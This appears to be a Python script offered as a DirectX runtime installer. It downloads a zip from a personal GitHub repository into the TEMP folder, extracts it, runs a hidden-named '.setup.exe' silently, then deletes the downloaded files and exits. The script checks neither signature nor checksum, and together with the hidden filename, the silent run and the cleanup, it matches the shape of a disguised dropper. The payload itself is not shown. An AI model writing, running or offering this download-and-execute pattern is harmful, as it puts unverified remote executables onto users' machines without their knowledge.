import os, requests, zipfile, subprocess, time, shutil

def download_directx_zip(url, save_path):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))
        block_size = 1024
        progress = 0
        
        with open(save_path, 'wb') as file:
            for data in response.iter_content(block_size):
                file.write(data)
                progress += len(data)
                percent = (progress / total_size) * 100
                print(f"\r> Downloading runtime packages : % {percent:.1f}", end="")
        print()
    except Exception as e:
        print(f"\n> Download failed: {e}")
        raise

def extract_zip(zip_path, extract_to):
    try:
        if not os.path.exists(extract_to):
            os.makedirs(extract_to)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            total_files = len(zip_ref.infolist())
            for i, file in enumerate(zip_ref.infolist(), 1):
                zip_ref.extract(file, extract_to)
                percent = (i / total_files) * 100
                print(f"\r> Extracting runtime packages : %{percent:.1f}", end="")
        print()
    except Exception as e:
        print(f"\n> Extraction failed: {e}")
        raise

def install_directx(installer_path):
    try:
        process = subprocess.Popen([installer_path, '/silent'])
        process.wait()
    except Exception as e:
        print(f"> Installation failed: {e}")
        raise

def start():
    try:
        directx_url = 'https://github.com/barankrky/directx_installer/raw/refs/heads/main/directx.zip'  
        temp_path = os.environ['TEMP']
        zip_path = os.path.join(temp_path, 'directx.zip')
        extract_path = os.path.join(temp_path, 'directx_installer')
        installer_path = os.path.join(extract_path, 'directx', '.setup.exe')  

        download_directx_zip(directx_url, zip_path)

        os.makedirs(extract_path, exist_ok=True)
        extract_zip(zip_path, extract_path)

        print("> Installing runtime packages...")
        install_directx(installer_path)

        shutil.rmtree(zip_path, ignore_errors=True)
        shutil.rmtree(extract_path, ignore_errors=True)
        print("> Installation completed. Exiting in 5 seconds...")
        time.sleep(5)
        exit()
    except Exception as e:
        print(f"> Process failed: {e}")
